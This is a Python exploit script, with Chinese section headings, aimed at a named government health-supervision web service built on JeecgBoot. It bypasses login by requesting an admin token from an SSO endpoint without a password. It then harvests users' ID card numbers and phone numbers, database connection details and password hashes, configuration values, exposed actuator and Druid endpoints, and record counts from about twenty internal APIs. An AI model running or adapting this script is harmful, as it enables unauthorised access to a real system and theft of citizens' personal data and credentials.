import requests, json, urllib3
urllib3.disable_warnings()

BASE = "https://wsjdzf.gxws.cn/visor-server/jeecg-boot"
HEADERS = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
TOKEN = None

def req(method, path, data=None):
    url = f"{BASE}{path}"
    h = dict(HEADERS)
    if TOKEN:
        h["X-Access-Token"] = TOKEN
    if data is not None:
        r = requests.request(method, url, json=data, headers=h, verify=False, timeout=15)
    else:
        r = requests.request(method, url, headers=h, verify=False, timeout=15)
    return r.json()

# 1. 获取Token
result = req("POST", "/sys/loginsinglesign", {"username": "admin"})
TOKEN = result["result"]["token"]
print("=" * 60)
print("成果一：SSO认证绕过")
print("=" * 60)
print(json.dumps(result, indent=2, ensure_ascii=False)[:2000])
print()

# 2. 用户列表
print("=" * 60)
print("成果二：用户列表（身份证+手机号）")
print("=" * 60)
users = req("POST", "/sys/user/list?pageNo=1&pageSize=5", {})
u = users["result"]
print(f"total: {u['total']}")
for r in u["records"][:5]:
    idcard = r.get("idCard", "")
    phone = r.get("phone", "")
    name = r.get("realname", "?")
    org = r.get("supervisoryOfficeName", "?")
    if len(idcard) == 18:
        w = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        c = "10X98765432"
        s = sum(int(idcard[i]) * w[i] for i in range(17))
        ok = "OK" if c[s % 11] == idcard[17].upper() else "FAIL"
        print(f"  {name} | ID:{idcard} chk={ok} dob={idcard[6:14]} | PH:{phone}")
        print(f"    ORG: {org}")
print()

# 3. 业务数据
print("=" * 60)
print("成果三：业务数据")
print("=" * 60)
apis = [
    ("检查记录", "/checkRecord/list?pageNo=1&pageSize=5"),
    ("检查结果", "/checkResult/list?pageNo=1&pageSize=5"),
    ("问题反馈", "/problemFeedback/list?pageNo=1&pageSize=5"),
    ("违法线索", "/cluesIllegal/list?pageNo=1&pageSize=5"),
    ("系统日志", "/sys/log/list?pageNo=1&pageSize=5"),
    ("监督人员", "/supervisor/list?pageNo=1&pageSize=5"),
]
for name, path in apis:
    r = req("GET", path)
    total = r["result"]["total"]
    print(f"  {name}: total={total}")
print()

# 4. 数据库凭据
print("=" * 60)
print("成果四：数据库凭据")
print("=" * 60)
ds = req("GET", "/sys/dataSource/list?pageNo=1&pageSize=5")
r = ds["result"]["records"][0]
print(f"  数据源: {r['name']}")
print(f"  DB类型: {r['dbType_dictText']}")
print(f"  连接串: {r['dbUrl']}")
print(f"  用户名: {r['dbUsername']}")
print(f"  密码MD5: {r['dbPassword']}")
print(f"  库名: {r['dbName']}")
print()

# 5. 其他风险
print("=" * 60)
print("成果五：其他安全风险")
print("=" * 60)
act = req("GET", "/actuator")
print(f"  Actuator: {act['_links']['self']['href']}")
print(f"  Druid: https://wsjdzf.gxws.cn/visor-server/jeecg-boot/druid/login.html")
cfg = req("GET", "/config/srConfig/list?pageNo=1&pageSize=10")
for c in cfg["result"]["records"]:
    print(f"  配置: {c['confName']} = {c['confValue']}")
print()

# 6. 全量汇总
print("=" * 60)
print("全量数据汇总")
print("=" * 60)
all_apis = [
    ("系统日志", "/sys/log/list?pageNo=1&pageSize=1"),
    ("系统用户", "/sys/user/list?pageNo=1&pageSize=1"),
    ("检查记录", "/checkRecord/list?pageNo=1&pageSize=1"),
    ("检查结果", "/checkResult/list?pageNo=1&pageSize=1"),
    ("问题反馈", "/problemFeedback/list?pageNo=1&pageSize=1"),
    ("违法线索", "/cluesIllegal/list?pageNo=1&pageSize=1"),
    ("监督人员", "/supervisor/list?pageNo=1&pageSize=1"),
    ("区划数据", "/region/list?pageNo=1&pageSize=1"),
    ("自查任务指标", "/tasknorm/srTaskNorm/list?pageNo=1&pageSize=1"),
    ("医疗指标", "/norm/srNormMedical/list?pageNo=1&pageSize=1"),
    ("任务机构", "/taskmedicalunit/srTaskMedicalUnit/list?pageNo=1&pageSize=1"),
    ("整改记录", "/taskmeasures/srTaskMeasures/list?pageNo=1&pageSize=1"),
    ("专业类别", "/regulations/specialty/list?pageNo=1&pageSize=1"),
    ("法律法规", "/regulations/srRegulations/list?pageNo=1&pageSize=1"),
    ("图表列表", "/srreport/srReport/list?pageNo=1&pageSize=1"),
    ("工作日志", "/workLog/list?pageNo=1&pageSize=1"),
    ("通知公告", "/noticeAnnouncement/list?pageNo=1&pageSize=1"),
    ("问题", "/problem/list?pageNo=1&pageSize=1"),
    ("配置参数", "/config/srConfig/list?pageNo=1&pageSize=1"),
    ("角色", "/sys/role/list?pageNo=1&pageSize=1"),
]
for name, path in all_apis:
    try:
        r = req("GET", path)
        total = r["result"]["total"]
        if total:
            print(f"  {name}: {total}")
    except:
        pass
